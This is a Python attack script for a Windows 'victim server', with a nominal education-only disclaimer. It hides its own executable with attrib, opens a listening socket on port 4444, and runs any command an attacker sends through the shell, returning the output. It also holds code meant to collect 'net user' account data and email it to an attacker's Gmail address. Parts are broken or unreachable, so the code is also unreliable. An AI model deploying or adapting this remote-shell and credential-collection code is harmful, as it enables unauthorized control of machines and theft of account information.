#!/usr/bin/env python

__author__ = "Kharim Mchatta"

#To connect to it upload the script on the victim server 
#On your attack machine run the command below:

#nc target-ip target-port

#############################################
#       Simple Reverse Listener             #
#         by Kharim Mchatta                 #
#############################################


##############################################
#  Disclaimer: This code should be used for  #
#        Education Purpose Only.             #
#  Any Malicious use of the code would not   #
#     hold the author responsible.           #
##############################################


# -*- coding: utf-8 -*-
import socket, os, sys, subprocess, smtplib, re

hide = 'attrib +s +h server.exe' #data hiding Technique

os.system(hide)

ip = '192.168.1.14'

port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(5)

print('[*]listening to %s:%d' % (ip, port))

client, addr = server.accept()

print('[*]connected to %s:%d' % (ip, port))

os.chdir('C:\\') #the program to go to drive C: directly

while True:
    # recieve data from the client
    data = str(client.recv(8192))
    data = data.strip()
    
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        
    elif data.strip() == "exit":
        client.sendall("cheers")
        client.close()
        sys.exit(0)

    else:

        # seneding output to the attacker

        user, output = os.popen4(data)

        client.sendall(output.read() + str(os.getcwd()) + '>')



DEVNULL = open(os.devnull, 'wb')

#sending all user account to the hackers email
mail = "dummyd054@gmail.com" #replace with your email address
password = "xxxxxxx" #type your password
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(mail, password)
server.sendmail(mail, mail, password)

user = "net user" #collecting system user account

profile = subprocess.check_output(user, shell=True, stderr=DEVNULL, stdin=DEVNULL)
profiles = re.findall(br"(?:Profile\s*:\s)(.*)", profile)

os.system(user)

output = ""
for profile in profiles:
    user = 'net user' + 'name=' + '"' + profile.decode('utf-8') 
    new = subprocess.check_output(user, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    output = output + new.decode('utf-8')

server.quit()
